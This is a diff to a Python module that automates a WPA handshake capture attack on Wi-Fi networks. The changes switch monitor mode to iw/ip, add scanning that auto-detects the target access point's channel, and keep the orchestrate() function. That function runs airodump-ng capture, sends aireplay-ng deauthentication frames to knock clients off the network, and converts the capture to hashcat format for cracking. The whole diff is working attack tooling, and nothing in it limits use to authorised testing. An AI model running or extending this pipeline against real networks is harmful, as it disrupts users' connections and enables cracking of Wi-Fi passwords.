@@ -15,42 +15,172 @@ are pure and testable; nothing here runs until orchestrate() is called.
 from __future__ import annotations
 
 import os
+import re
 import shutil
 import subprocess
 import time
 
 __all__ = [
-    "TOOLS", "missing_tools", "monitor_start", "monitor_stop", "scan",
+    "TOOLS", "missing_tools", "monitor_up", "monitor_down", "set_channel",
+    "scan_cmd", "parse_scan", "channel_for", "scan",
     "capture", "deauth", "convert_22000", "plan", "orchestrate",
 ]
 
-# The external tools this pipeline needs, and what each is for.
+# The external tools this pipeline needs, and what each is for. Monitor mode is
+# driven with iw/ip (in place, no renamed *mon interface) rather than airmon-ng:
+# the in-kernel USB Wi-Fi drivers (rtw89, mt76, ...) keep the same interface
+# name and airmon-ng's "wlan1mon" is never created, so an iw-based setup is what
+# actually works on them -- and iw/ip ship with every Linux.
 TOOLS = {
-    "airmon-ng": "put the adapter into monitor mode",
+    "iw": "set monitor mode and lock the channel",
+    "ip": "bring the interface down/up around the mode change",
     "airodump-ng": "capture the 802.11 handshake",
     "aireplay-ng": "send the deauth that forces a reconnect",
     "hcxpcapngtool": "convert the .cap to hashcat 22000",
 }
 
 
-def missing_tools(which=shutil.which) -> list:
-    """Which of the required tools are not on PATH (install: aircrack-ng + hcxtools)."""
+def _which_incl_sbin(tool: str) -> "str | None":
+    """shutil.which, but also looks in the sbin dirs. The Wi-Fi tools (iw,
+    airodump-ng, aireplay-ng) live in /usr/sbin and /sbin, which are often not on
+    a normal user's PATH even though the tools are installed and run fine under
+    sudo -- so a plain which() would wrongly report them missing."""
+    found = shutil.which(tool)
+    if found:
+        return found
+    for d in ("/usr/sbin", "/sbin", "/usr/local/sbin"):
+        cand = os.path.join(d, tool)
+        if os.path.isfile(cand) and os.access(cand, os.X_OK):
+            return cand
+    return None
+
+
+def missing_tools(which=None) -> list:
+    """Which required tools are not installed (install: aircrack-ng + hcxtools;
+    iw/ip are in iproute2/iw and almost always already present). Looks in the
+    sbin dirs too, since that is where the Wi-Fi tools usually live."""
+    which = which or _which_incl_sbin
     return [t for t in TOOLS if not which(t)]
 
 
-def monitor_start(iface: str, sudo: str = "sudo") -> list:
-    """Command to put ``iface`` into monitor mode (yields e.g. wlan1mon)."""
-    return [sudo, "airmon-ng", "start", iface]
+def monitor_up(iface: str, sudo: str = "sudo") -> list:
+    """Commands to put ``iface`` into monitor mode in place (same name). Returns
+    a list of command lists: down, set type monitor, up."""
+    return [
+        [sudo, "ip", "link", "set", iface, "down"],
+        [sudo, "iw", "dev", iface, "set", "type", "monitor"],
+        [sudo, "ip", "link", "set", iface, "up"],
+    ]
 
 
-def monitor_stop(mon_iface: str, sudo: str = "sudo") -> list:
-    """Command to drop monitor mode and restore managed networking."""
-    return [sudo, "airmon-ng", "stop", mon_iface]
+def monitor_down(iface: str, sudo: str = "sudo") -> list:
+    """Commands to drop monitor mode and restore managed networking on ``iface``."""
+    return [
+        [sudo, "ip", "link", "set", iface, "down"],
+        [sudo, "iw", "dev", iface, "set", "type", "managed"],
+        [sudo, "ip", "link", "set", iface, "up"],
+    ]
+
+
+def set_channel(iface: str, channel, sudo: str = "sudo") -> list:
+    """Command to lock a monitor interface to one channel (2.4 or 5 GHz)."""
+    return [sudo, "iw", "dev", iface, "set", "channel", str(channel)]
+
+
+def scan_cmd(iface: str, sudo: str = "sudo") -> list:
+    """Command to scan for nearby APs on a MANAGED interface (not the monitor
+    one -- scanning needs managed mode). Feed its output to parse_scan()."""
+    return [sudo, "iw", "dev", iface, "scan"]
+
+
+def _freq_to_channel(mhz: int) -> "int | None":
+    """802.11 frequency (MHz) -> channel number, for 2.4 GHz and 5 GHz."""
+    if mhz == 2484:
+        return 14
+    if 2412 <= mhz <= 2472:
+        return (mhz - 2407) // 5
+    if 5000 <= mhz <= 5900:
+        return (mhz - 5000) // 5
+    return None
+
+
+def parse_scan(text: str) -> list:
+    """Parse `iw dev <iface> scan` output into a list of
+    {bssid, ssid, freq, channel, signal} dicts, strongest signal first."""
+    aps: list = []
+    cur: dict = {}
+    for line in (text or "").splitlines():
+        s = line.strip()
+        m = re.match(r"BSS ([0-9a-fA-F:]{17})", s)
+        if m:
+            if cur.get("bssid"):
+                aps.append(cur)
+            cur = {"bssid": m.group(1).lower(), "ssid": "", "freq": None,
+                   "channel": None, "signal": None}
+        elif s.startswith("freq:"):
+            try:
+                cur["freq"] = int(float(s.split(":", 1)[1].strip()))
+                cur["channel"] = _freq_to_channel(cur["freq"])
+            except ValueError:
+                pass
+        elif s.startswith("signal:"):
+            try:
+                cur["signal"] = float(s.split(":", 1)[1].strip().split()[0])
+            except (ValueError, IndexError):
+                pass
+        elif s.startswith("DS Parameter set: channel"):
+            try:
+                cur["channel"] = int(s.rsplit("channel", 1)[1].strip())
+            except ValueError:
+                pass
+        elif s.startswith("SSID:"):
+            cur["ssid"] = s[5:].strip()
+    if cur.get("bssid"):
+        aps.append(cur)
+    aps.sort(key=lambda a: (a["signal"] is None, -(a["signal"] or -999)))
+    return aps
+
+
+def channel_for(aps: list, bssid: str = None, ssid: str = None) -> "int | None":
+    """The channel of the target AP: matched by BSSID if given, else the
+    strongest AP with the given SSID. None if not found."""
+    if bssid:
+        b = bssid.lower()
+        for a in aps:
+            if a.get("bssid") == b:
+                return a.get("channel")
+        return None
+    if ssid is not None:
+        for a in aps:                       # aps are strongest-first
+            if a.get("ssid") == ssid and a.get("channel"):
+                return a.get("channel")
+    return None
 
 
 def scan(mon_iface: str, sudo: str = "sudo") -> list:
-    """Command to list nearby APs (BSSID, channel, clients)."""
+    """Deprecated alias kept for compatibility: list nearby APs with airodump-ng.
+    Prefer scan_cmd()/parse_scan() on a managed interface."""
     return [sudo, "airodump-ng", mon_iface]
+
+
+def list_aps(iface: str, runner=None) -> list:
+    """Scan on ``iface`` and return nearby APs (strongest first). The interface
+    is put back to managed mode first, because scanning needs managed mode --
+    so this works even if the adapter was left in monitor mode by a prior run."""
+    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
+                                                    text=True, timeout=30, check=False))
+    for cmd in monitor_down(iface):
+        runner(cmd)
+    res = runner(scan_cmd(iface))
+    return parse_scan(getattr(res, "stdout", "") or "")
+
+
+def find_channel(iface: str, bssid: str = None, ssid: str = None,
+                 runner=None) -> "int | None":
+    """Auto-detect the target AP's channel by scanning on ``iface`` -- so the
+    operator never has to look it up. Matches by BSSID, else the strongest AP
+    with the given SSID."""
+    return channel_for(list_aps(iface, runner=runner), bssid=bssid, ssid=ssid)
 
 
 def capture(mon_iface: str, bssid: str, channel, prefix: str,
@@ -79,25 +209,27 @@ def convert_22000(cap_file: str, out_file: str) -> list:
 
 def plan(iface: str, bssid: str, channel, client: str = None, count: int = 5,
          prefix: str = "matt-wpa", out: str = "matt-wpa.22000") -> list:
-    """The ordered recipe (list of commands) for a handshake capture: monitor on,
-    channel-locked capture, deauth trigger, convert to 22000, monitor off. Used
-    by --wpa --dry-run and as the single source of truth for orchestrate()."""
-    mon = iface if iface.endswith("mon") else iface + "mon"
-    return [
-        ("monitor on", monitor_start(iface)),
-        ("capture", capture(mon, bssid, channel, prefix)),
-        ("deauth", deauth(mon, bssid, client, count)),
-        ("convert", convert_22000(prefix + "-01.cap", out)),
-        ("monitor off", monitor_stop(mon)),
-    ]
+    """The ordered recipe (list of (label, command) pairs) for a handshake
+    capture: monitor on (iw), lock the channel, channel-locked capture, deauth
+    trigger, convert to 22000, monitor off. The single source of truth for both
+    --wpa --dry-run and orchestrate(); monitor mode is set in place on ``iface``
+    (no renamed *mon interface)."""
+    steps = [("monitor on", cmd) for cmd in monitor_up(iface)]
+    steps.append(("set channel", set_channel(iface, channel)))
+    steps.append(("capture", capture(iface, bssid, channel, prefix)))
+    steps.append(("deauth", deauth(iface, bssid, client, count)))
+    steps.append(("convert", convert_22000(prefix + "-01.cap", out)))
+    steps += [("monitor off", cmd) for cmd in monitor_down(iface)]
+    return steps
 
 
 def orchestrate(iface: str, bssid: str, channel, client: str = None, count: int = 5,
                 prefix: str = "matt-wpa", out: str = "matt-wpa.22000",
                 capture_secs: float = 20.0, runner=None, popen=None,
                 which=None) -> dict:
-    """Run the handshake capture for real: start the channel-locked capture in
-    the background, fire a short deauth, let it run, stop, and convert.
+    """Run the handshake capture for real: set ``iface`` to monitor mode in place,
+    lock its channel, start the channel-locked capture in the background, fire a
+    short deauth, let it run, stop, convert, and restore managed mode.
 
     ``runner`` (default subprocess.run) and ``popen`` (default subprocess.Popen)
     are injectable so tests drive the whole flow without a radio. Returns a dict
@@ -116,14 +248,15 @@ def orchestrate(iface: str, bssid: str, channel, client: str = None, count: int 
         result["error"] = "missing tools: " + ", ".join(gone)
         return result
 
-    mon = iface if iface.endswith("mon") else iface + "mon"
-    runner(monitor_start(iface))
-    result["steps"].append("monitor on")
-    cap = popen(capture(mon, bssid, channel, prefix))
+    for cmd in monitor_up(iface):
+        runner(cmd)
+    runner(set_channel(iface, channel))
+    result["steps"].append("monitor on, channel %s" % channel)
+    cap = popen(capture(iface, bssid, channel, prefix))
     result["steps"].append("capture started")
     try:
         time.sleep(1.0)
-        runner(deauth(mon, bssid, client, count))
+        runner(deauth(iface, bssid, client, count))
         result["steps"].append("deauth sent")
         time.sleep(max(1.0, capture_secs))
     finally:
@@ -133,9 +266,10 @@ def orchestrate(iface: str, bssid: str, channel, client: str = None, count: int 
         except Exception:
             pass
         result["steps"].append("capture stopped")
-    conv = runner(convert_22000(prefix + "-01.cap", out))
+    runner(convert_22000(prefix + "-01.cap", out))
     result["steps"].append("converted")
     result["ok"] = os.path.exists(out)
-    runner(monitor_stop(mon))
+    for cmd in monitor_down(iface):
+        runner(cmd)
     result["steps"].append("monitor off")
     return result
